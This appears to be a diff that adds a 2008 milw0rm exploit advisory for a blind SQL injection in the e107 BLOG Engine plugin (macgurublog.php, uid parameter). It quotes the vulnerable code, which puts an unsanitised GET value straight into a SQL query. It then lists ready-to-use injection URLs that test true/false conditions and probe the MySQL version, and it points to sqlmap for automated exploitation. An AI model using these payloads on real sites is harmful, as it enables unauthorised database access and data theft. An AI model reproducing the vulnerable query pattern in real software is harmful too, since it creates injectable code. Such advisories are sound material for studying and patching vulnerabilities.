@@ -1,0 +1,44 @@
+##################################################################################################
+  #                                                                                                #
+  # ::e107 Plugin BLOG Engine v2.2 (macgurublog.php/uid) Blind SQL Injection Vulnerability::       #
+  #                                                                                                #          
+  ##################################################################################################
+
+Virangar Security Team
+
+www.virangar.net
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal)
+
+-------vuln codes in:-----------
+macgurublog.php:
+line 18:$buid = $_GET['uid'];
+..
+..
+line 31:$sql -> db_Select("user", "user_name", "user_id=".$buid);
+---
+exploit:
+[-]note=becuse e107 using diffrent prefix/table names it's impossible to writting exploit for it :(
+
+http://site.com/e107_plugins/macgurublog_menu/macgurublog.php?uid=1 and 2>1/*   #the page fully loaded
+
+http://site.com/e107_plugins/macgurublog_menu/macgurublog.php?uid=1 and 1>3/*   #page loaded whit any data and some error that say "The user has hidden their blog."
+
+cheking the mysql version:
+http://site.com/e107_plugins/macgurublog_menu/macgurublog.php?uid=1 and substring(@@version,1,1)=5
+or
+http://site.com/e107_plugins/macgurublog_menu/macgurublog.php?uid=1 and substring(@@version,1,1)=4
+
+# you can exploting the bug white blind sql automatic toolz such as sqlmap or ...
+---
+young iranian h4ck3rz
+
+# milw0rm.com [2008-05-22]
